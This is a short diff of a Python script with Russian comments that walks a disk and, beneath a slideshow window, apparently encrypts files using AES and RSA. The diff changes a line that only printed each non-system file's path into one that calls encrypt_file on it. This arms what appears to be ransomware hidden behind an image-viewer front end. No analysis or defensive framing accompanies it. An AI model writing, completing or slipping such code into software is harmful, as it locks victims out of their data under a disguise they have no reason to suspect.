@@ -3,7 +3,6 @@ from Cryptodome.Cipher import AES, PKCS1_OAEP
 from Cryptodome.PublicKey import RSA
 from Cryptodome.Random import get_random_bytes
 
-
 import base64
 import zlib
 import os
@@ -90,7 +89,7 @@ def encrypt_disk_files(disk):
                 # Полный путь к файлу
                 filepath = os.path.join(root, file)
                 if not is_system_or_hidden_file(filepath):
-                    print(filepath)
+                    encrypt_file(filepath)
 
 
 def is_system_directory(directory):
@@ -113,5 +112,3 @@ if __name__ == "__main__":
     delay = 2000  # Например, 2000 мс = 2 секунды
     app = SlideShow(form, image_files, delay)
     form.mainloop()
-
-
